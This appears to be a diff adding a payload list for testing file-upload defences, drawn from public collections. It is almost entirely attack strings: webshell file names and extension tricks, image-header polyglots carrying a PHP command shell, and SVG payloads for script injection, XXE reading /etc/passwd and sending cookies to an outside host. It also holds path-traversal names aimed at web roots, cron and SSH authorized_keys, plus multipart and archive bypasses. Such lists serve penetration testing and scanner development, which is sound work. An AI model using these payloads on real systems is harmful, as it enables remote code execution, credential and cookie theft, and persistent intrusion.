@@ -1,0 +1,102 @@
+# category: file-upload
+# description: File-upload bypasses — extension, content-type, magic bytes, polyglots, SVG-XXE.
+# references: HackTricks File Upload, SecLists Upload Insecure.
+# notes: Listed as filename + content-type pairs where relevant.
+
+# ── Extension / content-type bypasses ────────────────────────────────────
+shell.php
+shell.pht
+shell.phtml
+shell.php3
+shell.php4
+shell.php5
+shell.php7
+shell.phar
+shell.inc
+shell.php.jpg
+shell.php%00.jpg
+shell.php;.jpg
+shell.php.bmp
+shell.php%20.jpg
+shell.jpg.php
+shell.php.
+shell.php..
+shell.php:: $DATA
+shell.jsp
+shell.jspx
+shell.jspf
+shell.jhtml
+shell.aspx
+shell.asp
+shell.cer
+shell.cdx
+shell.asa
+shell.ashx
+shell.ascx
+shell.pl
+shell.cgi
+shell.py
+shell.rb
+shell.sh
+shell.exe
+shell.dll
+shell.war
+shell.jar
+shell.html
+shell.htm
+shell.shtml
+shell.xhtml
+shell.xml
+shell.svg
+shell.svgz
+
+# ── Content-Type overrides ───────────────────────────────────────────────
+Content-Type: image/jpeg
+Content-Type: image/png
+Content-Type: image/gif
+Content-Type: image/svg+xml
+Content-Type: application/pdf
+Content-Type: application/octet-stream
+Content-Type: application/x-php
+Content-Type: text/plain
+Content-Type: multipart/mixed
+
+# ── Magic-byte polyglots ─────────────────────────────────────────────────
+GIF89a;<?php system($_GET['c']); ?>
+GIF87a<?php system($_GET['c']); ?>
+\x89PNG\r\n\x1a\n<?php system($_GET['c']); ?>
+\xFF\xD8\xFF\xE0<?php system($_GET['c']); ?>
+PK\x03\x04  (embedded shell in ZIP, uploads as .zip)
+#!/usr/bin/php -q\n<?php system($_GET['c']); ?>
+<?xml version="1.0"?><svg><script>alert(1)</script></svg>
+
+# ── SVG-driven XSS / XXE / SSRF ─────────────────────────────────────────
+<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>
+<svg><script type="text/javascript">alert(1)</script></svg>
+<svg><image href="http://x.test/${document.cookie}"/></svg>
+<svg xmlns="http://www.w3.org/2000/svg"><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><text>&xxe;</text></svg>
+<svg><use xlink:href="data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><image href='1' onerror='alert(1)'/></svg>#x"/></svg>
+
+# ── Path-traversal filenames ─────────────────────────────────────────────
+../../../etc/cron.d/x
+../../../var/www/html/shell.php
+..\\..\\..\\inetpub\\wwwroot\\shell.aspx
+../.ssh/authorized_keys
+../../../proc/self/cmdline
+/dev/stdout
+/proc/self/fd/1
+C:\\inetpub\\wwwroot\\shell.aspx
+
+# ── Boundary / mime abuses ───────────────────────────────────────────────
+filename="shell.php"\r\nContent-Type: image/jpeg
+filename="../../shell.php"
+filename=;filename="shell.php"
+filename="shell.jpg";filename*=UTF-8''shell.php
+Content-Disposition: form-data; name="file"; filename*=UTF-8''shell.php
+Content-Disposition: attachment; filename="\0.php"
+
+# ── Compressed / archive-based ───────────────────────────────────────────
+zip://shell.zip#shell.php
+phar://shell.phar/x
+shell.tar  (contains ../../../etc/cron.d/x)
+shell.zip  (contains ../../../var/www/html/shell.php)
